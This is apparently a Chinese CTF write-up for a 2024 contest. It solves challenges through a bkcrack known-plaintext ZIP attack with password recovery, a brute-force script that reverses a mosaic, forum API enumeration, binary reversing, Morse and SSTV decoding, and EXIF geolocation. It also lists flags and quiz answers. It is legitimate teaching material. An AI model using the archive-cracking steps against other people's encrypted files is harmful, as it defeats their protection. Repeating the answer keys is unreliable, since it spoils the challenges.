文件是已知的，可以从 <a href="https://www.tpcup.org/anticheat.js">https://www.tpcup.org/anticheat.js</a> 下载，需要压缩后才可以用工具 (bkcrack&#x2F;rbkcrack&#x2F;pkcrack) 爆破密钥</p><p>这题和压缩工具关系很大，使用 <code>pyminizip == 0.2.6</code> 在 <code>compress_level = 0 or 6</code> 下可以成功，<code>zip = 3.0-11.1</code> 和 <code>7z = 23.01</code> 均失败 <del>，还是在群聊中得知的压缩工具</del></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crypto.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pyminizip</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;level:<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    pyminizip.compress(<span class="string">&quot;anticheat.js&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;anticheat.zip&quot;</span>, <span class="literal">None</span>, i)</span><br><span class="line">    <span class="comment"># os.system(&quot;zip -%d anticheat.zip anticheat.js &gt; /dev/null&quot; % (i))</span></span><br><span class="line">    <span class="comment"># os.system(&quot;7z a -tzip -mx%d anticheat.zip anticheat.js &gt; /dev/null&quot; % (i))</span></span><br><span class="line">    os.system(<span class="string">&quot;bkcrack -C prob05.zip -c anticheat.js -P anticheat.zip -p anticheat.js&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">❯ python crypto.py</span><br><span class="line">level:0</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[21:59:49] Z reduction using 44370 bytes of known plaintext</span><br><span class="line">26.0 % (11536 / 44370)</span><br><span class="line">[21:59:50] Attack on 155 Z values at index 33459</span><br><span class="line">Keys: d0043c88 20e5781d 2160b96d</span><br><span class="line">94.8 % (147 / 155)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the attack with the option: --continue-attack 147</span><br><span class="line">[21:59:50] Keys</span><br><span class="line">d0043c88 20e5781d 2160b96d</span><br></pre></td></tr></table></figure><p>用密钥获取压缩包密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">❯ bkcrack -C prob05.zip -c uncrackable.m4a -k d0043c88 20e5781d 2160b96d -b \?a -l 12</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[22:42:55] Recovering password</span><br><span class="line">length 12...</span><br><span class="line">Password: bQCvRH7q1ULs</span><br><span class="line">60.4 % (2321 / 3844)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the password recovery with the option: --continue-recovery 625151303030</span><br><span class="line">[22:42:59] Password</span><br><span class="line">as bytes: 62 51 43 76 52 48 37 71 31 55 4c 73</span><br><span class="line">as text: bQCvRH7q1ULs</span><br></pre></td></tr></table></figure><p>用密码解压之后查看 uncrackable.m4a 末尾的附加字符 <code>strings uncrackable.m4a | grep flag</code></p><p><code>flag&#123;z1p_IsN7_5ucH_S4f3&#125;</code></p><h3 id="下面是之前的附件的错误解法"><a href="#下面是之前的附件的错误解法" class="headerlink" title="下面是之前的附件的错误解法"></a>下面是之前的附件的错误解法</h3><p>之前的附件，给出提示部分 M4A 头字节(摩斯密码，五位一组) <code>7479706d7000000</code> 补个 0 就有 8 位，我以为是这个是压缩后的，猜测前三位是 <code>000000</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">❯ bkcrack -C prob05.zip -c 70.m4a -p 70.txt -o 5 -x 0 000000</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[00:47:57] Attack on 4194304 Z values at index 12</span><br><span class="line">Keys: 5bb795f4 424af6b2 acadf670</span><br><span class="line">43.6 % (1828975 / 4194304)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the attack with the option: --continue-attack 1828975</span><br><span class="line">[01:02:46] Keys</span><br><span class="line">5bb795f4 424af6b2 acadf670</span><br></pre></td></tr></table></figure><p>可以爆出密钥（但是是错误的），所以最后解密压缩包的时候提示文件损坏 <code>zlib.error: Error -3 while decompressing data: invalid stored block lengths</code> 可惜</p><h3 id="下面可能是正确的解法"><a href="#下面可能是正确的解法" class="headerlink" title="下面可能是正确的解法"></a>下面可能是正确的解法</h3><p>zip 明文攻击至少需要 12 位字符，其中 8 位要连续<br>这个压缩包的 <code>compress_level == 5</code>，提示的是 M4A 头，但不是连续的。第 0-2 位是 <code>000000</code>，搜索文件头可以查到第 3 位一般是 <code>20</code>，但我生成了一个文件第 3 位是 <code>1C</code>。。。<br>第 4-9 位是 <code>667479706070</code> 就是提示的，但现在只有 10 位，还需要两位。可以随机抓后面的空白部分来补充位数，之后就可能可以正常爆破密钥了（没爆出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">❯ python crypto.py</span><br><span class="line">level:5</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[22:16:14] Z reduction using 1048569 bytes of known plaintext</span><br><span class="line">0.8 % (8070 / 1048569)</span><br><span class="line">[22:16:15] Attack on 130 Z values at index 1041024</span><br><span class="line">Keys: a08fc77f 1dd36012 734e2126</span><br><span class="line">76.2 % (99 / 130)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the attack with the option: --continue-attack 99</span><br><span class="line">[22:16:15] Keys</span><br><span class="line">a08fc77f 1dd36012 734e2126</span><br></pre></td></tr></table></figure><p>压缩包密码是：<code>D0mbgaf6OhNp</code> 解密即可</p><blockquote><p>uncrackable.m4a 是周深的 Unstoppable （挺配的</p></blockquote><h2 id="非常好忽悠混合"><a href="#非常好忽悠混合" class="headerlink" title="非常好忽悠混合"></a>非常好忽悠混合</h2><p>flag1 找个哔站视频下载的解析下原始标题得到（在去年的时候就知道了<br>flag2 在视频的第二帧出现（一眼</p><p><code>flag&#123;h0W_d0_y0U_kN0w_mY_V1d3O_n4M3&#125;</code><br><code>flag&#123;f1Nd_7H3_f14g_iN_Th3_S3c0nD_fr4m3&#125;</code></p><h2 id="心中无码，自然高清"><a href="#心中无码，自然高清" class="headerlink" title="心中无码，自然高清"></a>心中无码，自然高清</h2><p>这题是连蒙带猜的，基本思路就是遍历字符生成马赛克，看和密文是否一致（或误差很小）<br>到下划线要更改 44&#x2F;45 行，为 <code>ll = len(flag) - 1</code> 调整枚举中间位置，如果为空可以跳过，这样能得到 <code>flag&#123;lag&#123;ev3R tH1</code> 如果没有结果可以把 50 行取消注释，输出差别较小的字母，再猜下能还原 flag</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont, ImageChops</span><br><span class="line">k = <span class="number">0</span></span><br><span class="line">flag = <span class="string">r&#x27;flag&#123;&#x27;</span></span><br><span class="line"><span class="keyword">while</span> k &lt; <span class="number">255</span>:</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(k)</span><br><span class="line"></span><br><span class="line">    H = <span class="number">68</span></span><br><span class="line">    W = <span class="number">34</span></span><br><span class="line"></span><br><span class="line">    canvas = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (W * <span class="built_in">len</span>(flag), H), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))</span><br><span class="line">    font = ImageFont.truetype(</span><br><span class="line">        <span class="string">&#x27;./JetBrainsMono-Regular.ttf&#x27;</span>, <span class="number">56</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    pen = ImageDraw.Draw(canvas)</span><br><span class="line">    pen.text((<span class="number">0</span>, <span class="number">0</span>), flag, <span class="string">&#x27;black&#x27;</span>, font)</span><br><span class="line"></span><br><span class="line">    canvas.save(<span class="string">&#x27;flag_uncensored.png&#x27;</span>, <span class="built_in">format</span>=<span class="string">&#x27;png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        char = canvas.crop((W * i, <span class="number">0</span>, W * (i + <span class="number">1</span>), H))</span><br><span class="line">        char.save(<span class="string">f&#x27;./tmp_char/char_<span class="subst">&#123;i&#125;</span>.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mosaic_img</span>(<span class="params">img: Image.Image, L, H, R, D</span>):</span><br><span class="line">        w, h = R - L, D - H</span><br><span class="line">        a = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">        cnt = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(w):</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(h):</span><br><span class="line">                j = img.getpixel((L + x, H + y))</span><br><span class="line">                <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">                    a[ch] += j[ch]</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line">        b = [k // cnt <span class="keyword">for</span> k <span class="keyword">in</span> a]</span><br><span class="line">        mosaic = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (w, h), <span class="built_in">tuple</span>(b))</span><br><span class="line">        img.paste(mosaic, (L, H, R, D))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>, <span class="built_in">len</span>(flag)):</span><br><span class="line">        mosaic_img(canvas, W * i, <span class="number">0</span>, W * i + W, H // <span class="number">2</span>)</span><br><span class="line">        mosaic_img(canvas, W * i, H // <span class="number">2</span>, W * i + W, H)</span><br><span class="line"></span><br><span class="line">    canvas.save(<span class="string">&#x27;flag_censored.png&#x27;</span>, <span class="built_in">format</span>=<span class="string">&#x27;png&#x27;</span>)</span><br><span class="line">    f = Image.<span class="built_in">open</span>(<span class="string">&#x27;./70.png&#x27;</span>)</span><br><span class="line">    censored = Image.<span class="built_in">open</span>(<span class="string">&#x27;./flag_censored.png&#x27;</span>)</span><br><span class="line">    ll = <span class="built_in">len</span>(flag)</span><br><span class="line">    <span class="comment"># ll = len(flag) - 1</span></span><br><span class="line">    cropped_region = f.crop((W * (ll - <span class="number">1</span>), <span class="number">0</span>, W * ll, H // <span class="number">2</span>))</span><br><span class="line">    censored_cropped = censored.crop((W * (ll - <span class="number">1</span>), <span class="number">0</span>, W * ll, H // <span class="number">2</span>))</span><br><span class="line">    diff = ImageChops.difference(censored_cropped, cropped_region)</span><br><span class="line">    <span class="keyword">if</span> diff.getextrema()[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">1</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">2</span>][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># print(&quot;not best&quot;, chr(k), diff.getextrema())</span></span><br><span class="line">        cropped_region = f.crop((W * (ll - <span class="number">1</span>), H // <span class="number">2</span>, W * ll, H))</span><br><span class="line">        censored_cropped = censored.crop((W * (ll - <span class="number">1</span>), H // <span class="number">2</span>, W * ll, H))</span><br><span class="line">        diff = ImageChops.difference(censored_cropped, cropped_region)</span><br><span class="line">        <span class="keyword">if</span> diff.getextrema()[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">1</span>][<span class="number">0</span>] == <span class="number">0</span> <span class="keyword">and</span> diff.getextrema()[<span class="number">2</span>][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(k), diff.getextrema())</span><br><span class="line">    flag = flag[:-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p><code>flag&#123;ev3RytH1ng_1s_Cl3Ar&#125;</code></p><h2 id="躺平问答"><a href="#躺平问答" class="headerlink" title="躺平问答"></a>躺平问答</h2><blockquote><p>上周，身为2024届英才计划培养对象的出题人ZianTT参加了一次冬令营，请问他的活动大致地点是？（七个汉字）</p></blockquote><p>不会有人不止到 HIT 吧（</p><blockquote><p>在2023年，Cloudflare因为机房停电导致大量服务不可用，Cloudflare官方博客记载此时的英文版链接是：</p></blockquote><p>如何干翻 CloudFlare？给它的数据中心拉闸（，在 cf 的 blog 可以找到 （或者直接搜</p><blockquote><p>QQ上线了新春活动，但糟糕的体验显然引发了一些用户的困扰，关闭该功能的链接是？（一个由https:&#x2F;&#x2F;开始的链接）</p></blockquote><p>这是最后才出的题，本来以为要前几年的关闭入口，结果填今年的表单就行，在 QA 群里可以找到</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">提示</span><br><span class="line">QQ 春节活动关闭登记表</span><br><span class="line">https://docs.qq.com/form/page/DUWl2cXN2WktZVWlB</span><br><span class="line">设置 - 关于 QQ 与帮助 - 反馈 - 「如何关闭春节红包活动」</span><br><span class="line">2024-02-06</span><br><span class="line">15.6K viewsedited  </span><br><span class="line">12:29</span><br></pre></td></tr></table></figure><blockquote><p>HTCPCP是一种类似HTTP的协议，用于控制咖啡壶，其中，当发送了BREW请求来冲泡的时候，如果服务认为请求的添加项组合违背了饮酒者对所述种类的共识，返回的状态码是：</p></blockquote><p>懒得看就把文档的状态码都试下</p><blockquote><p>OpenAI在2024年1月发生了多少运行事件(以公示数据为准 )：</p></blockquote><p>goto <a href="https://status.openai.com/history">https://status.openai.com/history</a> 数下一月份的数据</p><blockquote><p>比赛平台域名tpcup.org的Registry Domain ID 是：</p></blockquote><p>在 <a href="https://lookup.icann.org/en/lookup">https://lookup.icann.org/en/lookup</a> 查到</p><blockquote><p>本次比赛计算服务提供商所在主体纳税人识别号是：（18位由数字和大写字母组成的字符串）</p></blockquote><p>赞助商是晞云，在官网给出了公司名，搜索一下纳税人识别号就行</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_1&quot;</span><span class="punctuation">:</span><span class="string">&quot;哈尔滨工业大学&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_2&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://blog.cloudflare.com/post-mortem-on-cloudflare-control-plane-and-analytics-outage&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_3&quot;</span><span class="punctuation">:</span><span class="string">&quot;https://docs.qq.com/form/page/DUWl2cXN2WktZVWlB&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_4&quot;</span><span class="punctuation">:</span><span class="string">&quot;403&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_5&quot;</span><span class="punctuation">:</span><span class="string">&quot;11&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_6&quot;</span><span class="punctuation">:</span><span class="string">&quot;6de68c6722e84ac0a541745e94b7dca0-LROR&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ans_7&quot;</span><span class="punctuation">:</span><span class="string">&quot;91440403MACK9P7J40&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><del>XX，一道都做不出来，重开吧</del><br><code>全做出来了！这是flag1flag&#123;I_L0v3_tP4sK&#125;这是flag2flag&#123;very_go0d_questOnS&#125;</code></p><blockquote><p>中英文没空格差评</p></blockquote><h2 id="躺平论坛"><a href="#躺平论坛" class="headerlink" title="躺平论坛"></a>躺平论坛</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>F12 Find flag1</p><p><code>flag&#123;we1cc0m3_t0_taN6P4ng_f0Rum&#125;</code></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>flag2 要找到有 flag 的 discussion，但说不能批量尝试（<br>看了下 flarum 的查询接口，默认一次 20 条有点慢，总共 1048 条要试 53 。但猜测它有 limit 参数可以控制数量，测试发现一次最多 50 条，只要发 21 次就能找到了<br>连接： <a href="https://forum.tpcup.org/api/discussions?page%5Boffset%5D=450&page%5Blimit%5D=50">&#x2F;api&#x2F;discussions?page[offset]&#x3D;450&amp;page[limit]&#x3D;50</a></p><p>看到 flag 才知道预期解是看 sitemap<br>可以从 <a href="https://forum.tpcup.org/sitemap.xml">&#x2F;sitemap.xml</a> 到 <a href="https://forum.tpcup.org/sitemap-live/1">&#x2F;sitemap-live&#x2F;1</a> 到 <a href="https://forum.tpcup.org/d/566-flag">&#x2F;d&#x2F;566-flag</a> 找到 flag</p><p><code>flag&#123;1_C5n_F1n5_f14G_Fr0m_s1t3m4p&#125;</code></p><h2 id="HIT-准入认证"><a href="#HIT-准入认证" class="headerlink" title="HIT! 准入认证!"></a>HIT! 准入认证!</h2><h3 id="flag1-1"><a href="#flag1-1" class="headerlink" title="flag1"></a>flag1</h3><p>flag1 查看字符串</p><p><code>flag&#123;ZI4n7T_a7T3nd_ycjH_w1nt3r_c4mP_1n_h1t&#125;</code></p><h3 id="flag2-1"><a href="#flag2-1" class="headerlink" title="flag2"></a>flag2</h3><p>分析 sub_1165 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1165</span><span class="params">(__int64 a1, <span class="type">char</span> a2, __int64 a3, __int64 a4, <span class="type">int</span> a5)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)i &gt;= a5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)((<span class="type">int</span>)i + a4) = a2 * *(_BYTE *)((<span class="type">int</span>)i + a1) + *(_BYTE *)((<span class="type">int</span>)i + a3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把 a1 字符每一位乘以 233 加上 a3 数组对应位的值模 256。sub_125E 函数是 base64 换表编码。</p><p>base64 码表：<code>asdfghjklqwertyuiopzxcvbnmQWERTYUIOPZXCVBNMASDFGHJKL$%^)!@#&amp;*(-?</code></p><p>base64 密文：<code>%%xv$v^DlcLAHnMaxNF^ndmEOVr^r^?v-AJoOJczCo$.</code></p><p>a3 数组对应的是 unk_4060，可以直接从跟踪中获取</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a3 = [<span class="number">0x1</span>, <span class="number">0x9</span>, <span class="number">0xcd</span>, <span class="number">0x12</span>, <span class="number">0x7a</span>, <span class="number">0x9e</span>, <span class="number">0x79</span>, <span class="number">0xf1</span>, <span class="number">0x74</span>, <span class="number">0x19</span>, <span class="number">0x19</span>, <span class="number">0xc</span>, <span class="number">0xdb</span>, <span class="number">0x6f</span>, <span class="number">0x25</span>, <span class="number">0x14</span>, <span class="number">0xdd</span>, <span class="number">0x61</span>, <span class="number">0x13</span>, <span class="number">0xe2</span>, <span class="number">0x8b</span>, <span class="number">0xbc</span>, <span class="number">0xc4</span>, <span class="number">0x26</span>, <span class="number">0x83</span>, <span class="number">0xbe</span>, <span class="number">0xb8</span>, <span class="number">0x70</span>, <span class="number">0xaa</span>, <span class="number">0x4a</span>, <span class="number">0x90</span>, <span class="number">0x58</span>]</span><br><span class="line">a1= [<span class="number">0xd7</span>, <span class="number">0x55</span>, <span class="number">0x16</span>, <span class="number">0xd1</span>, <span class="number">0x6d</span>, <span class="number">0xad</span>, <span class="number">0x21</span>, <span class="number">0x5c</span>, <span class="number">0xeb</span>, <span class="number">0xc1</span>, <span class="number">0x8a</span>, <span class="number">0x80</span>, <span class="number">0x52</span>, <span class="number">0x9b</span>, <span class="number">0xb6</span>, <span class="number">0x60</span>, <span class="number">0x26</span>, <span class="number">0x5c</span>, <span class="number">0x8a</span>, <span class="number">0x73</span>, <span class="number">0x36</span>, <span class="number">0x33</span>, <span class="number">0x6f</span>, <span class="number">0xd6</span>, <span class="number">0xfa</span>, <span class="number">0xbc</span>, <span class="number">0x51</span>, <span class="number">0x8b</span>, <span class="number">0x15</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x1d</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a1)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> (j * <span class="number">233</span> + a3[i]) % <span class="number">256</span> == a1[i]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>flag&#123;7h3_hIT_LilaC_is_s0_N1c3!!&#125;</code></p><h2 id="bepbep"><a href="#bepbep" class="headerlink" title="bepbep"></a>bepbep</h2><h3 id="flag1-2"><a href="#flag1-2" class="headerlink" title="flag1"></a>flag1</h3><p>morse2ascii 你值得拥有</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">❯ morse2ascii morse.wav</span><br><span class="line"></span><br><span class="line">MORSE2ASCII 0.2.1</span><br><span class="line">by Luigi Auriemma</span><br><span class="line">e-mail: aluigi@autistici.org</span><br><span class="line">web:    aluigi.org</span><br><span class="line"></span><br><span class="line">- open morse.wav</span><br><span class="line">wave size      597040</span><br><span class="line">format tag     1</span><br><span class="line">channels:      1</span><br><span class="line">samples/sec:   8000</span><br><span class="line">avg/bytes/sec: 8000</span><br><span class="line">block align:   1</span><br><span class="line">bits:          8</span><br><span class="line">samples:       597040</span><br><span class="line">bias adjust:   0</span><br><span class="line">volume peaks:  -31744 31744</span><br><span class="line">normalize:     1023</span><br><span class="line"></span><br><span class="line">- decoded morse data:</span><br><span class="line">flag  g3t  f14g  fr0m  mor3ecad3  add  underline  between  each  word  go  to  https:://storage..wearos..fans//amarket//name..wav  (all  lowercase))</span><br></pre></td></tr></table></figure><p><code>flag&#123;g3t_f14g_fr0m_mor3ecad3&#125;</code></p><h3 id="flag2-2"><a href="#flag2-2" class="headerlink" title="flag2"></a>flag2</h3><p>flag2 是 SSTV，用 Qsstv 接收图像</p><p>flag{SSTV_IS_VERY_INTERESTING}</p><blockquote><p>HEN HAO DE JIE MI AI LAI ZI TANG PING BEI</p></blockquote><h2 id="我朝，大盒"><a href="#我朝，大盒" class="headerlink" title="我朝，大盒"></a>我朝，大盒</h2><h3 id="flag1-3"><a href="#flag1-3" class="headerlink" title="flag1"></a>flag1</h3><blockquote><p>问题1：图片中的位置附近有一条高速公路 请给出高速公路编号[G+两位数字]</p></blockquote><p>下载照片到手机，有提供 GPS 信息，直接定位。</p><blockquote><p>问题2：图片所在位置最近的市是哪个[XX(X)市]</p></blockquote><p>同上，地图可看</p><blockquote><p>问题3：图片采用的ISO感光度是多少</p></blockquote><p>看下 exif iso</p><h3 id="flag2-3"><a href="#flag2-3" class="headerlink" title="flag2"></a>flag2</h3><p>在 <a href="http://cnrail.geogv.org/zhcn/station/41060731">中国铁路地图 cnrail.geogv.org</a> 找下 漳县、陇南、广元这几个站，结合短信时间尝试</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans1&quot;</span><span class="punctuation">:</span><span class="string">&quot;G75&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans2&quot;</span><span class="punctuation">:</span><span class="string">&quot;阆中市&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans3&quot;</span><span class="punctuation">:</span><span class="string">&quot;138&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;token&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ans4&quot;</span><span class="punctuation">:</span><span class="string">&quot;D206&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">这是flag1flag<span class="punctuation">&#123;</span>wHO0ps_woc50_he<span class="punctuation">&#125;</span></span><br><span class="line">这是flag2flag<span class="punctuation">&#123;</span>a1_lA1_zI_gU0_T</span><br></pre></td></tr></table></figure><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><blockquote><p>答错出题人了，悲（</p></blockquote><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>【数据删除】<del>(来自群聊天记录）</del></p><h2 id="躺平聊天室2-0"><a href="#躺平聊天室2-0" class="headerlink" title="躺平聊天室2.0"></a>躺平聊天室2.0</h2><p>用 jadx-gui 逆向 apk，在 com.zhizi42.tpc2024.MainActivity 找到主要逻辑</p><h3 id="flag1-4"><a href="#flag1-4" class="headerlink" title="flag1"></a>flag1</h3><p>直接查看字符串</p><p><code>flag&#123;Th1s_1s_s0_s1mp1e&#125;</code></p><h3 